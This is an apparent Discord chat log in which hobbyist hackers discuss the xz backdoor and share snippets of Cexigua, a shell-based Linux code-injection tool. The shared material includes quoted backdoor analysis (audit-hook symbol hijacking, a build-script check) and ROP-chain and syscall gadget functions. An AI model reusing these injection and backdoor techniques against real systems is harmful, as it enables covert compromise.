+[infowski]
+[] friya Do you have one? How's the build quality?
+infowski 03/30/2024 12:26 AM
+A friend of mine does, it... Works for HASS dashboard with a bunch of
+buttons
+ 1 🇾 1 🇴 1  1
+[friya]
+[] infowski On an unrelated note, nice shit:
+https://www.aliexpress.com/item/1005006530671379.html
+friya 03/30/2024 12:25 AM
+Do you have one? How's the build quality?
+[smx2460]
+smx2460 03/30/2024 12:25 AM
+but I didn't finish it
+[smx2460]
+hellobox.
+https://discord.com/channels/407937994037919756/835489130967859251/1205218149881090199
+smx2460 03/30/2024 12:25 AM
+did I tell you that i kept going with that idea? 
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:20 AM
+I somehow doubt that someone has a fuzzer set-up at home for gpu
+registers
+[smx2460]
+smx2460 03/30/2024 12:20 AM
+now adding devDependencies
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:20 AM
+and how do they work
+03/30/2024 12:20 AM
+finding out such a sophisticated chain is one thing, but how does one
+find out about undocumented GPU debug registers
+[smx2460]
+smx2460 03/30/2024 12:20 AM
+well i mean from the same compiler dev
+03/30/2024 12:19 AM
+it's legit
+03/30/2024 12:19 AM
+oh
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:19 AM
+https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/
+on an unrelated note, I am still blown away by this
+[smx2460]
+smx2460 03/30/2024 12:19 AM
+(no content)
+[image.png]
+ image.png
+24.95 KB External
+hellobox. 03/30/2024 12:19 AM
+but these big companies want to use open source and not contribute
+anything back
+[smx2460]
+smx2460 03/30/2024 12:19 AM
+https://npmgraph.js.org/?q=svelte
+npmgraph - NPM Dependency Diagrams
+Graph / visualize of npm dependencies
+[] smx2460 `npm` is particularly at risk too
+hellobox. 03/30/2024 12:18 AM
+it's a shitshow in general
+[smx2460]
+smx2460 03/30/2024 12:18 AM
+npm is particularly at risk too (edited)
+03/30/2024 12:18 AM
+opensource is not scrutinized hard enough
+03/30/2024 12:18 AM
+this begs the same problem that was already emphasized by log4j
+hellobox. 03/30/2024 12:16 AM
+i wonder if we'll ever find out who was behind it. i'm sure it'll be
+investigated, but i kind of doubt the results will be made public
+03/30/2024 12:15 AM
+well, i guess it was probably his job
+03/30/2024 12:15 AM
+yeah right... i don't have the patience
+[maryjohanna42069]
+hellobox. i think i looked into it, and old glibc didn't support it
+maryjohanna42069 03/30/2024 12:08 AM
+Jia Tan spotted /s (edited)
+[smx2460]
+smx2460 03/30/2024 12:07 AM
+looks like it
+03/30/2024 12:07 AM
+    commit 8f7a75d700af809eeb4363895078fabfb3a9d7c3
+    Author: Florian Weimer <fweimer@redhat.com>
+    Date:   Mon Feb 17 16:49:40 2020 +0100
+        elf: Implement DT_AUDIT, DT_DEPAUDIT support [BZ #24943]
+        binutils ld has supported --audit, --depaudit for a long time,
+        only support in glibc has been missing.
+        Reviewed-by: Carlos O'Donell <carlos@redhat.com>
+03/30/2024 12:07 AM
+implemented in 2020?
+hellobox. 03/30/2024 12:07 AM
+https://discord.com/channels/407937994037919756/835489130967859251/1205218149881090199
+[smx2460]
+smx2460 03/30/2024 12:06 AM
+now that you mentioend it, we did
+03/30/2024 12:06 AM
+oh right
+hellobox. 03/30/2024 12:06 AM
+i think i looked into it, and old glibc didn't support it
+[smx2460]
+smx2460 03/30/2024 12:06 AM
+we could use that for our libcrypto compat  (edited)
+ 1
+03/30/2024 12:06 AM
+this is an interesting technique btw @hellobox
+03/30/2024 12:06 AM
+    To be able to resolve symbols in libraries that have not yet loaded, the
+    backdoor installs an audit hook into the dynamic linker, which can be observed
+    with gdb using
+      watch _rtld_global_ro._dl_naudit
+    It looks like the audit hook is only installed for the main binary.
+    That hook gets called, from _dl_audit_symbind, for numerous symbols in the
+    main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
+    resolved.  When called for that symbol, the backdoor changes the value of
+    RSA_public_decrypt@....plt to point to its own code.  It does not do this via
+    the audit hook mechanism, but outside of it.
+03/30/2024 12:05 AM
+so to make it not obvious
+03/30/2024 12:05 AM
+it also happens only on source builds
+03/30/2024 12:05 AM
+and also hiding his code in the process
+03/30/2024 12:05 AM
+making legitimate fixes
+03/30/2024 12:05 AM
+the guy remained around for TWO FUC*ING YEARS
+03/30/2024 12:05 AM
+the xz stuff is crazy
+[maryjohanna42069]
+maryjohanna42069 03/30/2024 12:05 AM
+valgrind errors maybe
+03/30/2024 12:04 AM
+i dont really believe that the guy just noticed this by checking the
+milliseconds of his ssh sessions taking longer
+03/30/2024 12:04 AM
+yea
+March 29, 2024
+hellobox. 03/29/2024 11:48 PM
+it must suck to have spent years setting this up (assuming this was the
+intent of "jia tan" all along) only to have it get detected so quickly
+(edited)
+03/29/2024 11:41 PM
+who knows whether these are actual users or just artificial pressure by
+whoever is behind the attack to get him to bring in another maintainer,
+but i would 100% believe a real user said that
+03/29/2024 11:39 PM
+lmao > I am sorry about your mental health issues, but its important to
+be > aware of your own limits. I get that this is a hobby project for
+all > contributors, but the community desires more.
+https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.html
+03/29/2024 11:35 PM
+https://mastodon.social/@glyph/112180922900094371
+Glyph
+Glyph (@glyph@mastodon.social)
+@eb@social.coop I really hope that this causes an industry-wide
+reckoning with the common practice of letting your entire goddamn
+product rest on the shoulders of one overworked person having a slow
+mental health crisis without financially or operationally supporting
+them whatsoever. I want everyone who has an open source dependency to
+read this...
+[infowski]
+infowski 03/29/2024 11:33 PM
+On an unrelated note, nice shit:
+https://www.aliexpress.com/item/1005006530671379.html
+hellobox. 03/29/2024 11:32 PM
+god, tons of people are rushing to comment on every potentially related
+commit/issue/anything, and it's clear many of them: 1. don't know how
+open source projects work 2. have likely never written any software
+whatsoever 3. have bizarre, paranoid ideas 4. know very little about
+what's going on with this situation specifically and just present wild
+speculation as if it's definitely true e.g.
+https://github.com/tukaani-project/xz/issues/92,
+https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+(edited)
+[maryjohanna42069]
+maryjohanna42069 03/29/2024 11:06 PM
+plus if I would have been him, I would have added a time bomb
+03/29/2024 11:06 PM
+and many other accounts
+03/29/2024 11:06 PM
+since some users like that hans guy started promiting the vulnerable
+source version like crazy the past weeks (edited)
+[maryjohanna42069]
+hellobox. seems like he thought of (almost) everything
+maryjohanna42069 03/29/2024 11:06 PM
+yet it feels stupid if the accusations people make turn to be true
+[friya]
+friya 03/29/2024 10:15 PM
+wow
+[friya]
+hellobox. this has to be a government
+friya 03/29/2024 10:14 PM
+Yeah, this is socially very very good
+[] dogelition https://github.com/google/oss-fuzz/pull/10667
+hellobox. 03/29/2024 9:18 PM
+seems like he thought of (almost) everything
+[dogelition]
+dogelition 03/29/2024 9:14 PM
+https://github.com/google/oss-fuzz/pull/10667
+xz: Disable ifunc to fix Issue 60259. by JiaT75 · Pull Request #106...
+Indirect function support was added to xz on machines that support it
+for function dispatching. ifunc is not compatible with
+-fsanitize=address, so this should be disabled for fuzzing builds.
+[]
+hellobox. 03/29/2024 8:22 PM
+since it looks like i somehow managed to not have 5.6.1 anywhere
+03/29/2024 8:22 PM
+if it only targeted x86-64, only worked in 5.6.1, and only affected
+sshd, i guess i'm fine
+03/29/2024 8:20 PM
+at least i don't have to worry about my ARM systems, i guess > These
+conditions include targeting only x86-64 linux: >
+ if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu DCPH0 quot; > /dev/null 2>&1);then
+03/29/2024 8:18 PM
+so was the backdoor the entire reason for using ifuncs?
+03/29/2024 8:18 PM
+although it was caught relatively quickly, so...
+03/29/2024 8:17 PM
+not a great look for open source imo https://bugs.gentoo.org/925415
+03/29/2024 8:16 PM
+so the backdoor was broken in 5.6.0?
+03/29/2024 8:15 PM
+i guess nobody has ever used this functionality in this way before...
+maybe it's only useful for backdoors 
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=114115 (edited)
+03/29/2024 8:14 PM
+lol somebody helped him fix it 
+https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
+[dogelition]
+dogelition 03/29/2024 8:14 PM
+https://twitter.com/bl4sty/status/1773780531143925959
+blasty (@bl4sty) on X
+nothing to see here, just properly documenting the fixed defects in the
+backdoor code 
+[]
+[]Twitter3/29/2024, 7:33:28 PM
+03/29/2024 8:13 PM
+kali too https://twitter.com/kalilinux/status/1773786266074513523
+Kali Linux (@kalilinux) on X
+The xz package, starting from version 5.6.0 to 5.6.1, was found to
+contain a backdoor. The impact of this vulnerability affected Kali
+between March 26th to March 29th. If you updated your Kali installation
+on or after March 26th, it is crucial to apply the latest updates today.
+[]Twitter3/29/2024, 7:56:15 PM
+hellobox. 03/29/2024 8:11 PM
+this has to be a government
+[dogelition]
+dogelition 03/29/2024 8:11 PM
+i would not have thought of that
+03/29/2024 8:11 PM
+great place to hide it, actually
+hellobox. 03/29/2024 8:10 PM
+wow, they hid part of the payload in test data
+03/29/2024 8:07 PM
+did somebody notice it in the 5.6.1 release?
+03/29/2024 8:07 PM
+how was it discovered?
+https://www.openwall.com/lists/oss-security/2024/03/29/4 (edited)
+03/29/2024 8:07 PM
+interesting
+    --- Changes for xz-utils (liblzma5 xz-utils) ---
+    xz-utils (5.6.1+really5.4.5-1) unstable; urgency=critical
+      * Non-maintainer upload by the Security Team.
+      * Revert back to the 5.4.5-0.2 version
+     -- Salvatore Bonaccorso <carnil@debian.org>  Thu, 28 Mar 2024 15:59:38 +0100
+    xz-utils (5.6.1-1) unstable; urgency=medium
+      * Non-maintainer upload.
+      * Import 5.6.1 (Closes: #1067708).
+      * Takeover maintenance of the package.
+     -- Sebastian Andrzej Siewior <sebastian@breakpoint.cc>  Wed, 27 Mar 2024 22:53:21 +0100
+[dogelition]
+dogelition 03/29/2024 8:06 PM
+my arch install was on 5.6.1-1
+hellobox. 03/29/2024 8:06 PM
+    xz-utils (5.6.0-0.2 => 5.6.1+really5.4.5-1)
+03/29/2024 8:05 PM
+    $ xz --version
+    xz (XZ Utils) 5.6.0
+    liblzma 5.6.0
+03/29/2024 8:02 PM
+wow https://news.ycombinator.com/item?id=39866275
+[dogelition]
+dogelition 03/29/2024 8:00 PM
+that's not good
+03/29/2024 8:00 PM
+https://archlinux.org/news/the-xz-package-has-been-backdoored/
+ 2  1
+hellobox. 03/29/2024 5:20 AM
+i wonder why vs code says this... it is an interactive rebase
+[Enkixng.png]
+ Enkixng.png
+4.27 KB External
+March 28, 2024
+hellobox. is the top one from the same company post-rename?
+ww8543 03/28/2024 11:56 PM
+haha now i have watched the video too 
+[smx2460]
+smx2460 03/28/2024 11:11 PM
+https://github.com/smx-smx/kaitai-pdb/commit/231205aad99f6cc93df79fe91bed5a112e15481b
+add support for REFSYM, and its weird "hidden data" which used to b...
+…ak parsing this &quot;hidden data&quot; (so is named in the Microsoft
+reference code) is actually the REFSYM&#39;s name. the strange thing is
+that REFSYM is the only type where the na...
+[]
+ww8543 03/28/2024 10:02 PM
+not sure if thats what is meant by "dvb isp" tho
+03/28/2024 10:01 PM
+high latency tho
+hellobox. what's a "DVB ISP"? are there ISPs that use TV transmissions
+for the downlink?
+ww8543 03/28/2024 10:01 PM
+there is satellite internet, that uses dvb for at least the downlink
+hellobox. 03/28/2024 9:36 PM
+how SoC vendors write BSPs:
+https://dl.acm.org/doi/10.1145/1151588.1151600
+hellobox. 03/28/2024 6:30 PM
+what's a "DVB ISP"? are there ISPs that use TV transmissions for the
+downlink?
+[lightfire]
+lightfire 03/28/2024 6:26 PM
+03/28/2024 6:26 PM
+remember how they launched the threads?
+hellobox. 03/28/2024 5:47 PM
+can you not search in (only) threads in discord? god, how do they manage
+to lack so many basic features? it looks like before you couldn't get
+results from threads *at all*; now they're just included in the channel
+they're part of
+https://support.discord.com/hc/en-us/community/posts/4407660133143-Searching-in-threads-sub-channels
+(edited)
+March 27, 2024
+hellobox. 03/27/2024 9:39 PM
+huh.
+[NTRVOWf.png]
+ NTRVOWf.png
+3.48 KB External
+ 1
+hellobox. 03/27/2024 8:53 PM
+being associated with copyright infringement is unlikely to help with
+getting it into app stores
+ 1  1  1
+layzard3663 03/27/2024 8:44 PM
+Sorry for that, and why? (edited)
+hellobox. 03/27/2024 8:43 PM
+i'm sure @jaruba will be happy to hear what you seem to think stremio is
+for
+layzard3663 Hey there, there's this app called 'Emby' on the store and i
+Wonder if it's possible to use It to wa...
+hellobox. 03/27/2024 8:41 PM
+https://discord.com/channels/407937994037919756/833398155265310781/833399616577732659
+layzard3663 03/27/2024 8:33 PM
+Hey there, there's this app called 'Emby' on the store and i Wonder if
+it's possible to use It to watch torrent (Pirated) movies/series like
+stremio or it's Just another IPTV player
+hellobox. 03/27/2024 7:49 PM
+also they're apparently abusing this now
+https://github.com/aleemrehmtulla/kytelink
+03/27/2024 7:48 PM
+this porn spam bot links you to a page that says not alone at home...
+don't they usually say the opposite?
+[Hw0LeuV.png]
+ Hw0LeuV.png
+7.55 KB External
+[batman_samourai]
+batman_samourai 03/27/2024 1:26 PM
+Hello, I do not know if is possible, but can we modify the software of a
+120Hz LG TV, in order to play 3D videos on it (side-by-side, blu-ray,
+...) ?
+hellobox. 03/27/2024 8:07 AM
+uh, so... where is it, then?
+https://bestwebhostingaustralia.org/browserscope-org-joins-aussie-hosting/
+hellobox. ughhhhhhhhhhhh my discord client just crashed and brought down
+the video driver i guess. i thought i...
+Deleted User 03/27/2024 5:26 AM
+discord crashes whenever i update my gpu driver but only discord,
+nothing else 
+March 26, 2024
+hellobox. 03/26/2024 11:53 PM
+ughhhhhhhhhhhh my discord client just crashed and brought down the video
+driver i guess. i thought i might have fixed the issue by totally
+uninstalling and reinstalling the drivers in safe mode, but apparently
+not 
+hellobox. 03/26/2024 11:13 PM
+i was looking at the board and thinking "where does the CPU go!?"... and
+then i remembered: slot CPUs
+ 2
+03/26/2024 11:12 PM
+and a CPU
+03/26/2024 11:12 PM
+it turned out the box had a whole bunch of cards in it too
+03/26/2024 11:11 PM
+i went to a thrift store today and bought an old intel motherboard
+hellobox. Click to see attachment
+Deleted User 03/26/2024 6:51 AM
+good ol top.gg
+hellobox. 03/26/2024 6:07 AM
+interesting. potential for data exfil?
+https://www.youtube.com/watch?v=eIdHBDSQHyw
+CNLohr
+How I broadcast LoRa packets WITHOUT a radio
+Code/Writeup/Resources: https://github.com/cnlohr/lolra Patreon:
+https://patreon.com/cnlohr Memes, in order of appearance: Tiny Paper
+Senior Chang, Trollface Rage Comic, Nerdy RF Mixer, 69-420, Sanic Gotta
+Go Fast, Midwit IQ Bell Curve, “Y U NO” Guy, Feels Good, This Is Fine,
+Great Gatsby Reaction If anyone wants to join my discord, feel free ...
+[] Watch video
+hellobox. 03/26/2024 4:46 AM
+do people actually watch this garbage?
+[VIdsKsv.png]
+ VIdsKsv.png
+1.21 MB External
+hellobox. 03/26/2024 3:53 AM
+(no content)
+[image0.jpg]
+ image0.jpg
+72.89 KB External
+hellobox. 03/26/2024 2:29 AM
+and it seems like the "1.0.903x" numbers might be mostly for those
+native bits
+03/26/2024 2:29 AM
+i was thinking "why are they having so much trouble switching to 64-bit?
+it's an electron app...", but of course they have native modules
+03/26/2024 2:26 AM
+ah, i think what happened is that it tried to download a delta for each
+module, which failed because it wasn't coming from 1.0.9034, so it
+downloaded full.distro for each one
+03/26/2024 2:25 AM
+oh, it seems like it does that for all of the modules, e.g.
+https://dl.discordapp.net/distro/app/stable/win/x64/1.0.9035/discord_utils/1/from/1.0.9034/1
+03/26/2024 2:23 AM
+looks like the same kind of file:
+https://dl.discordapp.net/distro/app/stable/win/x64/1.0.9035/discord_hook/1/from/1.0.9034/1
+(it was actually going 1.0.9036 -> 1.0.9035, not 1.0.9034 -> 1.0.9035)
+(edited)
+03/26/2024 2:21 AM
+> Squirrel: It's like ClickOnce but Works lol
+03/26/2024 2:19 AM
+[Q8FUTVd.png]
+ Q8FUTVd.png
+23.39 KB External
+03/26/2024 2:18 AM
+i wonder what kind of file this is:
+https://dl.discordapp.net/distro/app/stable/win/x64/1.0.9035/discord_dispatch/1/full.distro
+[smx2460]
+smx2460 03/26/2024 2:07 AM
+    readgeneric() {
+        # file, offset, count, echo result
+        file=""
+        [[ "${1}" != "-" ]] && file="if=${1}"
+        IFS=' ' data=($(dd ${file} skip=${2} count=${3} status=none bs=1 | tohex ${3}))
+        # reverse to get the correct byte order
+        rdata=""
+        for ((x=${#data[@]}; x>=0; x--)); do
+            rdata=${rdata}${data[${x}]}
+        done
+        if [[ ! -z ${4} ]]; then
+            echo $((16#${rdata}))
+        elif [[ ${3} -eq 2 ]]; then
+            retshort=$((16#${rdata}))
+        elif [[ ${3} -eq 4 ]]; then
+            retint=$((16#${rdata}))
+        elif [[ ${3} -eq 8 ]]; then
+            retlong=$((16#${rdata}))
+        else
+            echo $((16#${rdata}))
+        fi
+    }
+[smx2460]
+hellobox. lol i knew it would be using `dd`
+smx2460 03/26/2024 2:07 AM
+the single read function also uses dd
+[smx2460]
+smx2460 03/26/2024 2:05 AM
+    findstr() {
+        local OFFSET=${ALLSTRINGS%%$1*}
+        local NEGOFFSET=$((${STRINGSSIZE}-${#OFFSET}))
+        echo ${NEGOFFSET}
+    }
+    strptr() {
+        if [[ $((${STRINGSSIZE}%8)) -eq 0 ]]; then
+            echo $(($(($((16#${STACK[1]}))-$(findstr ${1})))))
+        else
+            echo $(($(($(($((16#${STACK[1]}))-$(findstr ${1})))))-$((8-$((${STRINGSSIZE}%8))))))
+        fi
+    }
+03/26/2024 2:04 AM
+    fnargs() {
+        SYSCALLSIZE=0
+        SYSCALL=
+        findgadget "$(printf "\x58\xc3")"                    # pop rax ; ret
+        SYSCALL=${SYSCALL}${gadgetaddr}
+        # when we're called from pltcall, this is already a valid address string
+        # otherwise we need to encode it, because it's a syscall id
+        if [[ ${1} = \\x* ]]; then
+            SYSCALL=${SYSCALL}${1}
+        else
+            SYSCALL=${SYSCALL}$(hexlify ${1})
+        fi
+        shift
+        SYSCALLSIZE=$((${SYSCALLSIZE}+2))
+        [[ -z ${1} ]] && return
+        # this is from the x64 Linux ABI
+        GADGETS=(
+            "\x5f\xc3"     # pop rdi; ret
+            "\x5e\xc3"     # pop rsi; ret
+            "\x5a\xc3"     # pop rdx; ret
+            "\x59\xc3"     # pop rcx; ret
+            "\xff\xd0\xc3" # pop r8 ; ret
+            "\xff\xd1\xc3" # pop r9 ; ret
+            )
+        for gadget in ${GADGETS[@]}; do
+            findgadget "$(printf ${gadget})"
+            SYSCALL=${SYSCALL}${gadgetaddr}
+            SYSCALL=${SYSCALL}$(hexlify ${1})
+            shift
+            SYSCALLSIZE=$((${SYSCALLSIZE}+2))
+            [[ -z ${1} ]] && break
+        done
+    }
+03/26/2024 2:04 AM
+    # execute a syscall in the ROPChain, with all arguments setup appropriately
+    syscall() {
+        fnargs $@
+        findgadget "$(printf "\x0f\x05\xc3")"                # syscall ; ret
+        SYSCALL=${SYSCALL}${gadgetaddr}
+        SYSCALLSIZE=$((${SYSCALLSIZE}+1))
+        # global management
+        SLEDLEN=$((${SLEDLEN}-${SYSCALLSIZE}))
+        SYSCALLS+=(${SYSCALL})
+    }
+03/26/2024 2:04 AM
+lol there's also a ropchain generator in shell
+hellobox. 03/26/2024 2:04 AM
+lol i knew it would be using dd
+[smx2460]
+smx2460 03/26/2024 2:01 AM
+    getsect() {
+        LIB="${1}"
+        # return offset and size from a section
+        genlookup "${LIB}" false
+        e_shoff=$(readlong ${LIB} $((16#28)) 1)      # start of the section header table
+        e_shnum=$(readshort ${LIB} $((16#3C)) 1)     # number of section header entries
+        e_shentsize=$(readshort ${LIB} $((16#3A)) 1) # section header table entry size
+        e_shstrndx=$(readshort ${LIB} $((16#3E)) 1)  # index to section names section entry
+        shstrtab_offset=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#18)))) 1) # offset to shstrtab
+        shstrtab_size=$(readlong ${LIB} $((${e_shoff}+$((${e_shstrndx}*${e_shentsize}))+$((16#20)))) 1) # size of shstrtab
+        for ((i=0; i <= $((${e_shnum}-1)); i++)); do
+            # read the whole struct in one so we thrash less
+            dd if=${1} skip=$((${e_shoff}+$((${i}*${e_shentsize})))) count=$((16#28)) bs=1 status=none | parsesect
+            if [[ ! -z "${3}" ]]; then # if a type is specified
+                if [[ "${sh_type}" != "${3}" ]]; then # and it's not the same as the current sect
+                    continue # don't check the name
+                fi
+            fi
+            getsecstrtab "$((${sh_name}+1))"
+            if [[ "${secstr}" = "${2}" ]]; then
+                echo "${sh_offset} ${sh_size}"
+                break
+            fi
+        done
+    }
+03/26/2024 2:01 AM
+Wtf!
+03/26/2024 2:01 AM
+ELF parser written in shell (!)
+[:durka:] 1
+03/26/2024 2:01 AM
+@hellobox
+https://github.com/AonCyberLabs/Cexigua/blob/master/readsyms.sh
+Cexigua/readsyms.sh at master · AonCyberLabs/Cexigua
+Linux based inter-process code injection without ptrace(2) -
+AonCyberLabs/Cexigua
+[]
+[] kitsuned Click to see attachment
+hellobox. 03/26/2024 1:16 AM
+how many children has this run over? (i bet it's nonzero) (edited)
+hellobox. 03/26/2024 1:15 AM
+would they accept a PR? lol
+https://github.com/microsoft/vswhere/blob/613d3acf3c77e66dab5c40ba18228635c0350c6c/src/vswhere.lib/CommandArgs.cpp#L110
+03/26/2024 1:12 AM
+i am annoyed that there is no way to make vswhere default to finding
+prerelease versions again
+03/26/2024 1:12 AM
+microsoft guy
+https://github.com/microsoft/vswhere/issues/79#issuecomment-310491574"
+target="_blank" rel="noopener noreferrer">learning about semver and then
+https://devblogs.microsoft.com/setup/vswhere-version-2-0-released/"
+target="_blank" rel="noopener noreferrer">using it lol > Because this is
+a breaking change in behavior, following semantic version guidelines I
+have bumped the major version to 2. (edited)
+[kitsuned]
+kitsuned 03/26/2024 12:40 AM
+i would like to be served by a nekobot
+03/26/2024 12:39 AM
+100% cuteness
+[kitsuned]
+hellobox. Click to see attachment
+kitsuned 03/26/2024 12:38 AM
+(no content)
+[image0.jpg]
+ image0.jpg
+398.38 KB External
+ 1
+hellobox. 03/26/2024 12:16 AM
+all the recent x86/x64 installers contain the same Update.exe, which is
+copyright GitHub???
+          VALUE "Comments",          "Update"
+          VALUE "CompanyName",       "GitHub"
+          VALUE "FileDescription",   "Update"
+          VALUE "FileVersion",       "1.1.1.0"
+          VALUE "InternalName",      "Update.exe"
+          VALUE "LegalCopyright",    "Copyright  GitHub 2013-2015"
+(edited)
+03/26/2024 12:13 AM
+so i just noticed you can download the next version of the discord
+installer. for x86, it's
+https://dl.discordapp.net/distro/app/stable/win/x86/1.0.9038/DiscordSetup.exe
+for x64, it's
+https://dl.discordapp.net/distro/app/stable/win/x64/1.0.9036/DiscordSetup.exe
+(1.0.9035 is the latest version for x64; not sure what it is for x86.
+x64 always seems to be 2 versions behind x86) i'm using the x64 one. i
+checked inside the installer, and it does indeed have 1.0.9036 (as a
+NuGet package?!); however, immediately after installing it downloads and
+installs an "update" to 1.0.9035.
+March 25, 2024
+hellobox. 03/25/2024 10:05 PM
+there is no way CLOi is better or even cheaper than having a human do
+this
+[0qUtSZ7.png]
+ 0qUtSZ7.png
+290.79 KB External
+[:cloi:] 3
+03/25/2024 10:04 PM
+(no content)
+[MR1WZ9j.png]
+ MR1WZ9j.png
+235.44 KB External
+[itsyogsothoth]
+itsyogsothoth 03/25/2024 9:13 PM
+Yup, that's a floppy disk controller
+https://www.alldatasheet.com/datasheet-pdf/pdf/65280/HYNIX/GM82C765B.html
+GM82C765B Datasheet(PDF)
+Part #: GM82C765B. Download. File Size: 222Kbytes. Page: 36 Pages.
+Description: FLOPPY DISK SUBSYSTEM CONTROLLER. Manufacturer: Hynix
+Semiconductor.
+[]
+ww8543 03/25/2024 8:40 PM
+ah!
+ww8543 is that a jungle chip?
+hellobox. 03/25/2024 8:28 PM
+no; floppy disk controller i guess
+[] itsyogsothoth Someone's watching MVG as well
+hellobox. 03/25/2024 8:28 PM
+yep
+ww8543 03/25/2024 8:27 PM
+is that a jungle chip?
+[itsyogsothoth]
+hellobox. is the top one from the same company post-rename?
+itsyogsothoth 03/25/2024 7:56 PM
+Someone's watching MVG as well
+hellobox. 03/25/2024 7:35 PM
+https://www.eetimes.com/lg-semicon-injects-fresh-life-into-java-processors/
+https://web.archive.org/web/19991013040444/http://sun.com/microelectronics/communitysource/picojava/techinfo.html
+(edited)
+hellobox. is the top one from the same company post-rename?
+hellobox. 03/25/2024 7:33 PM
+> The corporate name was changed to LG Electronics and LG Cable on
+February 28, 1995 so 40th week 1995 would be after that. is it LG
+Semicon already?
+hellobox. 03/25/2024 7:25 PM
+LGIT: TV power supplies/wifi modules, iphone cameras, and missiles
+https://en.wikipedia.org/wiki/LIG_Nex1
+[smx2460]
+smx2460 03/25/2024 7:25 PM
+XD
+03/25/2024 7:25 PM
+From Life's Good to Life's Shit
+03/25/2024 7:24 PM
+Lol now it's called LS
+03/25/2024 7:24 PM
+LG-Fiat wtf
+hellobox. 03/25/2024 7:23 PM
+https://en.wikipedia.org/wiki/LG_Tractors" target="_blank" rel="noopener
+noreferrer">LG Tractors doesn't exist anymore 
+hellobox. 03/25/2024 7:12 PM
+is the top one from the same company post-rename?
+[wjBwahA.png]
+ wjBwahA.png
+356.37 KB External
+March 24, 2024
+hellobox. 03/24/2024 9:54 PM
+the title of this is "RT9466 I2C Issue on LG". i wonder what it means
+https://edit.wpgdadawant.com/uploads/news_file/program/2020/35881/tech_files/program_35881_suggest_test_rpt_file.pdf
+[smx2460]
+smx2460 03/24/2024 3:02 AM
+Vs emulated
+03/24/2024 3:02 AM
+But yeah that's what i meant by native
+[smx2460]
+hellobox. it's some kind of VM i think
+smx2460 03/24/2024 3:01 AM
+HyperV
+[smx2460]
+hellobox. i guess `kernelCommandLine`. not sure if it'll work with just
+`init=/bin/sh` though
+smx2460 03/24/2024 3:01 AM
+Yeah
+[smx2460]
+smx2460 03/24/2024 3:01 AM
+https://learn.microsoft.com/en-us/windows/wsl/wsl-config
+Advanced settings configuration in WSL
+A guide to the wsl.conf and .wslconfig files used for configuring
+settings when running multiple Linux distributions on Windows Subsystem
+for Linux.
+[]
+[] smx2460 Isn't wsl2 native
+hellobox. 03/24/2024 2:58 AM
+it's some kind of VM i think
+hellobox. 03/24/2024 2:58 AM
+i guess kernelCommandLine. not sure if it'll work with just init=/bin/sh
+though
+[smx2460]
+smx2460 03/24/2024 2:57 AM
+Isn't wsl2 native
+hellobox. 03/24/2024 2:57 AM
+not even sure how to change kernel command line
+[] smx2460 I would just boot with init=/bin/sh
+hellobox. 03/24/2024 2:57 AM
+WSL2
+hellobox. 03/24/2024 2:57 AM
+well, maybe not as fancy with the init stuff
+[smx2460]
+hellobox. i want to use it to resize my root fs
+smx2460 03/24/2024 2:57 AM
+I would just boot with init=/bin/sh
+hellobox. 03/24/2024 2:56 AM
+yeah i've done it manually in the past
+[smx2460]
+smx2460 03/24/2024 2:56 AM
+That could theoretically be done with ezinject on init too
+hellobox. 03/24/2024 2:56 AM
+i want to use it to resize my root fs
+[smx2460]
+smx2460 03/24/2024 2:56 AM
+By using only bash/busybox
+03/24/2024 2:56 AM
+I did that manually in my VM lol
+03/24/2024 2:55 AM
+@hellobox 
+03/24/2024 2:55 AM
+https://github.com/marcan/takeover.sh
+GitHub - marcan/takeover.sh: Wipe and reinstall a running Linux sys...
+Wipe and reinstall a running Linux system via SSH, without rebooting.
+You know you want to. - marcan/takeover.sh
+[]
+[smx2460]
+smx2460 03/24/2024 2:29 AM
+What are you using it for
+03/24/2024 2:29 AM
+I had the same experience in building it for Windows XP
+[smx2460]
+hellobox. i think i managed to build everything necessary, but that was
+janky af
+smx2460 03/24/2024 2:28 AM
+Yeah
+[_tiner]
+_tiner 03/24/2024 2:02 AM
+ok
+[] _tiner jailpatch.sh method din't run, so i'll stop here
+hellobox. 03/24/2024 1:56 AM
+jailpatch.sh should still work, but you're wasting your time. it's
+patched
+[_tiner]
+_tiner 03/24/2024 1:54 AM
+jailpatch.sh method din't run, so i'll stop here
+[_tiner]
+_tiner 03/24/2024 1:45 AM
+(no content)
+[image.png]
+ image.png
+37.92 KB External
+03/24/2024 1:44 AM
+i will install the homebrew channel
+03/24/2024 1:44 AM
+yep
+hellobox. 03/24/2024 1:44 AM
+did you factory reset?
+[] _tiner and now i finely connected 
+hellobox. 03/24/2024 1:44 AM
+how?
+[_tiner]
+_tiner 03/24/2024 1:43 AM
+and now i finely connected 
+hellobox. 03/24/2024 1:43 AM
+so, patched
+[_tiner]
+_tiner 03/24/2024 1:43 AM
+W19P
+03/24/2024 1:43 AM
+i found it
+03/24/2024 1:41 AM
+how i do to find thi OTAID?
+hellobox. 03/24/2024 1:32 AM
+i don't know what your OTAID is, but it's not W19O. and 05.40.20 on
+every other 2019 OTAID is patched
+03/24/2024 1:32 AM
+you will not be able to use crashd
+[_tiner]
+hellobox. you will probably have to factory reset
+_tiner 03/24/2024 1:31 AM
+im gonna try that
+[_tiner]
+hellobox. yeah, i suspected phishing or something
+_tiner 03/24/2024 1:30 AM
+but is just a prank, i guarantee
+[] kitsuned yeah, the domain looks wrong
+hellobox. 03/24/2024 1:29 AM
+yeah, i suspected phishing or something
+[kitsuned]
+kitsuned 03/24/2024 1:28 AM
+that's why i visited it
+03/24/2024 1:28 AM
+yeah, the domain looks wrong
+[_tiner]
+_tiner 03/24/2024 1:28 AM
+:/
+[_tiner]
+[] kitsuned go fuck yourself
+_tiner 03/24/2024 1:28 AM
+its a prank
+[kitsuned]
+kitsuned 03/24/2024 1:28 AM
+go fuck yourself
+[kitsuned]
+[] _tiner no, just disapperas before i installed dev mode
+kitsuned 03/24/2024 1:27 AM
+damn link in your bio
